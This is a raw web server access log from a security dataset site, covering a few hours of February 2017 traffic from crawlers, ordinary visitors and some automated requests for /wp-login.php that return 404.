112.27.198.131 - - [05/Feb/2017:22:48:05 -0800] "GET /pe_static/ap1.zip HTTP/1.1" 404 340 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.10 Safari/537.36" 
112.27.198.131 - - [05/Feb/2017:22:48:35 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.10 Safari/537.36" 
112.27.198.131 - - [05/Feb/2017:22:49:09 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Evernote Windows/303788 (zh-CN, DDL); Windows/6.1.7601 Service Pack 1 (Win64); Safari/537.36" 
112.27.198.131 - - [05/Feb/2017:22:49:11 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27788 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Evernote Windows/303788 (zh-CN, DDL); Windows/6.1.7601 Service Pack 1 (Win64); Safari/537.36" 
112.27.198.131 - - [05/Feb/2017:22:49:21 -0800] "GET /pe_static/ap1.zip HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.10 Safari/537.36" 
112.27.198.131 - - [05/Feb/2017:22:49:41 -0800] "GET /pe_static/ap1.zip HTTP/1.1" 404 340 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.10 Safari/537.36" 
163.172.66.42 - - [05/Feb/2017:22:50:53 -0800] "GET /self.logs/error.log.2015-06-13.gz HTTP/1.1" 200 546 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
111.13.102.4 - - [05/Feb/2017:22:51:12 -0800] "HEAD /pe_static/ap1.zip HTTP/1.1" 404 220 "-" "-" 
111.13.102.7 - - [05/Feb/2017:22:51:14 -0800] "HEAD /pe_static/ap1.zip HTTP/1.1" 404 220 "-" "-" 
220.181.165.8 - - [05/Feb/2017:22:51:16 -0800] "HEAD /pe_static/ap1.zip HTTP/1.1" 404 220 "-" "-" 
73.214.203.114 - - [05/Feb/2017:22:54:19 -0800] "GET / HTTP/1.1" 200 10269 "https://t.co/oWHtBZzWYf" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Mobile/14C92 Twitter for iPhone" 
73.214.203.114 - - [05/Feb/2017:22:54:19 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Mobile/14C92 Twitter for iPhone" 
73.214.203.114 - - [05/Feb/2017:22:54:19 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Mobile/14C92 Twitter for iPhone" 
92.99.64.88 - - [05/Feb/2017:22:56:33 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
36.57.136.72 - - [05/Feb/2017:23:01:14 -0800] "GET / HTTP/1.0" 301 461 "http://secrepo.com" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)" 
163.172.66.77 - - [05/Feb/2017:23:01:42 -0800] "GET /self.logs/access.log.2016-08-27.gz HTTP/1.1" 200 7074 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
68.180.228.117 - - [05/Feb/2017:23:02:24 -0800] "GET /self.logs/access.log.2015-12-24.gz HTTP/1.1" 200 5354 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
157.55.39.53 - - [05/Feb/2017:23:04:16 -0800] "GET /self.logs/error.log.2016-01-23.gz HTTP/1.1" 200 884 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.53 - - [05/Feb/2017:23:05:44 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
68.180.228.117 - - [05/Feb/2017:23:11:29 -0800] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554468 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
50.135.67.38 - - [05/Feb/2017:23:13:13 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
50.135.67.38 - - [05/Feb/2017:23:13:17 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
50.135.67.38 - - [05/Feb/2017:23:13:20 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
157.55.39.53 - - [05/Feb/2017:23:20:58 -0800] "GET /self.logs/access.log.2015-08-11.gz HTTP/1.1" 200 6007 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
76.176.69.254 - - [05/Feb/2017:23:22:23 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0" 
76.176.69.254 - - [05/Feb/2017:23:22:23 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0" 
76.176.69.254 - - [05/Feb/2017:23:22:23 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0" 
76.176.69.254 - - [05/Feb/2017:23:22:23 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0" 
207.46.13.167 - - [05/Feb/2017:23:22:29 -0800] "GET /self.logs/access.log.2015-07-25.gz HTTP/1.1" 200 3566 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
180.138.72.131 - - [05/Feb/2017:23:35:08 -0800] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928460 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
163.172.66.75 - - [05/Feb/2017:23:43:33 -0800] "GET /self.logs/error.log.2016-03-16.gz HTTP/1.1" 200 776 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
66.102.9.63 - - [05/Feb/2017:23:46:34 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.9.61 - - [05/Feb/2017:23:46:35 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
212.81.152.194 - - [05/Feb/2017:23:52:37 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 304 165 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0" 
17.142.159.143 - - [05/Feb/2017:23:57:00 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
144.76.14.83 - - [05/Feb/2017:23:57:08 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.0; ; rv:1.8.0.10) Gecko/20070216 Firefox/1.9.0.1" 
144.76.14.83 - - [05/Feb/2017:23:57:08 -0800] "GET / HTTP/1.1" 200 10232 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.0; ; rv:1.8.0.10) Gecko/20070216 Firefox/1.9.0.1" 
54.167.239.8 - - [05/Feb/2017:23:57:54 -0800] "HEAD / HTTP/1.1" 200 239 "-" "Nuzzel" 
176.47.21.75 - - [06/Feb/2017:00:00:58 -0800] "GET / HTTP/1.1" 200 10269 "-" "Twitter/6.71.1 CFNetwork/808.3 Darwin/16.3.0" 
176.47.21.75 - - [06/Feb/2017:00:01:06 -0800] "GET / HTTP/1.1" 200 10269 "https://t.co/oWHtBZzWYf" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" 
176.47.21.75 - - [06/Feb/2017:00:01:06 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" 
176.47.21.75 - - [06/Feb/2017:00:01:07 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" 
134.7.57.118 - - [06/Feb/2017:00:02:27 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
134.7.57.118 - - [06/Feb/2017:00:02:28 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
134.7.57.118 - - [06/Feb/2017:00:02:28 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
134.7.57.118 - - [06/Feb/2017:00:02:28 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
192.81.133.229 - - [06/Feb/2017:00:03:45 -0800] "HEAD / HTTP/1.1" 200 295 "-" "Mozilla/5.0 (compatible; Veoozbot/1.0; +http://www.veooz.com/veoozbot.html)" 
40.77.167.84 - - [06/Feb/2017:00:12:34 -0800] "GET /self.logs/error.log.2015-05-31.gz HTTP/1.1" 200 828 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
213.239.217.85 - - [06/Feb/2017:00:12:59 -0800] "HEAD / HTTP/1.1" 200 295 "-" "Mozilla/5.0 (compatible; um-LN/1.0; mailto: techinfo@ubermetrics-technologies.com)" 
213.239.217.85 - - [06/Feb/2017:00:12:59 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; Windows; U; Windows NT 6.2; en-US; rv:12.0) Gecko/20120403211507 Firefox/12.0" 
213.239.217.85 - - [06/Feb/2017:00:13:00 -0800] "GET / HTTP/1.1" 200 34374 "-" "Mozilla/5.0 (compatible; Windows; U; Windows NT 6.2; en-US; rv:12.0) Gecko/20120403211507 Firefox/12.0" 
113.194.100.189 - - [06/Feb/2017:00:13:40 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
113.194.100.189 - - [06/Feb/2017:00:13:41 -0800] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
207.46.13.167 - - [06/Feb/2017:00:24:30 -0800] "GET /self.logs/access.log.2015-08-28.gz HTTP/1.1" 200 7681 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.102.9.61 - - [06/Feb/2017:00:29:16 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.9.61 - - [06/Feb/2017:00:29:16 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
109.26.216.163 - - [06/Feb/2017:00:37:13 -0800] "GET /maccdc2012/notice.log.gz HTTP/1.1" 200 20779 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
163.172.66.47 - - [06/Feb/2017:00:37:43 -0800] "GET /self.logs/access.log.2015-08-07.gz HTTP/1.1" 200 4579 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
109.26.216.163 - - [06/Feb/2017:00:39:53 -0800] "GET /tg/tg_snort_fast.7z HTTP/1.1" 200 4274093 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
163.172.66.13 - - [06/Feb/2017:00:41:22 -0800] "GET /self.logs/access.log.2016-02-02.gz HTTP/1.1" 200 7954 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
109.26.216.163 - - [06/Feb/2017:00:39:40 -0800] "GET /tg/a.zip HTTP/1.1" 200 66189337 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
40.77.167.84 - - [06/Feb/2017:00:41:56 -0800] "GET /maccdc2012/smtp.log.gz HTTP/1.1" 301 524 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.39 - - [06/Feb/2017:00:49:31 -0800] "GET /self.logs/access.log.2016-12-15.gz HTTP/1.1" 200 6999 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
212.36.212.194 - - [06/Feb/2017:00:59:41 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
212.36.212.194 - - [06/Feb/2017:00:59:46 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
212.36.212.194 - - [06/Feb/2017:00:59:51 -0800] "GET / HTTP/1.1" 200 34374 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
212.36.212.194 - - [06/Feb/2017:01:01:09 -0800] "GET /wp-login.php HTTP/1.1" 301 522 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
212.36.212.194 - - [06/Feb/2017:01:01:10 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
212.36.212.194 - - [06/Feb/2017:01:01:15 -0800] "GET /wp-login.php HTTP/1.1" 301 522 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
212.36.212.194 - - [06/Feb/2017:01:01:15 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
212.36.212.194 - - [06/Feb/2017:01:01:21 -0800] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
140.113.220.65 - - [06/Feb/2017:01:01:54 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
140.113.220.65 - - [06/Feb/2017:01:01:54 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
140.113.220.65 - - [06/Feb/2017:01:01:54 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
140.113.220.65 - - [06/Feb/2017:01:01:55 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
40.77.167.84 - - [06/Feb/2017:01:02:23 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
140.113.220.65 - - [06/Feb/2017:01:06:40 -0800] "GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1" 200 9478149 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
94.251.141.212 - - [06/Feb/2017:01:14:21 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
94.251.141.212 - - [06/Feb/2017:01:14:26 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
94.251.141.212 - - [06/Feb/2017:01:14:32 -0800] "GET / HTTP/1.1" 200 34374 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
134.249.159.113 - - [06/Feb/2017:01:17:14 -0800] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36" 
134.249.159.113 - - [06/Feb/2017:01:17:15 -0800] "GET / HTTP/1.1" 200 10232 "-" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36" 
106.38.241.146 - - [06/Feb/2017:01:19:04 -0800] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.146 - - [06/Feb/2017:01:19:05 -0800] "GET / HTTP/1.1" 301 446 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.146 - - [06/Feb/2017:01:19:10 -0800] "GET /robots.txt HTTP/1.1" 301 481 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
199.16.157.182 - - [06/Feb/2017:01:19:13 -0800] "GET /robots.txt HTTP/1.1" 200 233 "-" "Twitterbot/1.0" 
199.16.157.182 - - [06/Feb/2017:01:19:13 -0800] "GET / HTTP/1.1" 200 10213 "-" "Twitterbot/1.0" 
106.38.241.146 - - [06/Feb/2017:01:20:03 -0800] "GET / HTTP/1.1" 200 10232 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.146 - - [06/Feb/2017:01:20:17 -0800] "GET / HTTP/1.1" 200 10232 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
121.242.29.87 - - [06/Feb/2017:01:21:11 -0800] "GET / HTTP/1.1" 200 10269 "https://www.google.co.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
121.242.29.87 - - [06/Feb/2017:01:21:13 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 304 164 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
91.52.127.184 - - [06/Feb/2017:01:21:28 -0800] "GET / HTTP/1.1" 200 10269 "https://www.google.de/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12" 
91.52.127.184 - - [06/Feb/2017:01:21:28 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12" 
91.52.127.184 - - [06/Feb/2017:01:21:28 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12" 
91.52.127.184 - - [06/Feb/2017:01:21:29 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12" 
79.116.207.224 - - [06/Feb/2017:01:24:20 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
79.116.207.224 - - [06/Feb/2017:01:24:26 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
79.116.207.224 - - [06/Feb/2017:01:24:31 -0800] "GET / HTTP/1.1" 200 34374 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
83.61.54.139 - - [06/Feb/2017:01:24:43 -0800] "GET / HTTP/1.1" 200 10269 "https://www.google.es/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36" 
83.61.54.139 - - [06/Feb/2017:01:24:43 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36" 
83.61.54.139 - - [06/Feb/2017:01:24:43 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36" 
83.61.54.139 - - [06/Feb/2017:01:24:44 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36" 
79.116.207.224 - - [06/Feb/2017:01:32:37 -0800] "GET /wp-login.php HTTP/1.1" 301 522 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
79.116.207.224 - - [06/Feb/2017:01:32:37 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
79.116.207.224 - - [06/Feb/2017:01:32:43 -0800] "GET /wp-login.php HTTP/1.1" 301 522 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
79.116.207.224 - - [06/Feb/2017:01:32:43 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
79.116.207.224 - - [06/Feb/2017:01:32:48 -0800] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
79.116.207.224 - - [06/Feb/2017:01:32:48 -0800] "GET / HTTP/1.1" 200 34374 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
157.55.39.53 - - [06/Feb/2017:01:34:12 -0800] "GET /self.logs/access.log.2015-03-11.gz HTTP/1.1" 200 2460 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
199.59.150.180 - - [06/Feb/2017:01:36:03 -0800] "GET / HTTP/1.1" 200 10213 "-" "Twitterbot/1.0" 
187.33.162.66 - - [06/Feb/2017:01:38:39 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
187.33.162.66 - - [06/Feb/2017:01:38:45 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
187.33.162.66 - - [06/Feb/2017:01:38:50 -0800] "GET / HTTP/1.1" 200 34374 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
37.162.236.228 - - [06/Feb/2017:01:41:29 -0800] "GET / HTTP/1.1" 200 10269 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0" 
37.162.236.228 - - [06/Feb/2017:01:41:30 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0" 
37.162.236.228 - - [06/Feb/2017:01:41:32 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0" 
37.162.236.228 - - [06/Feb/2017:01:41:32 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0" 
180.252.235.180 - - [06/Feb/2017:01:42:40 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
180.252.235.180 - - [06/Feb/2017:01:42:46 -0800] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
180.252.235.180 - - [06/Feb/2017:01:42:52 -0800] "GET / HTTP/1.1" 200 34374 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
183.39.156.205 - - [06/Feb/2017:01:45:11 -0800] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5229 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
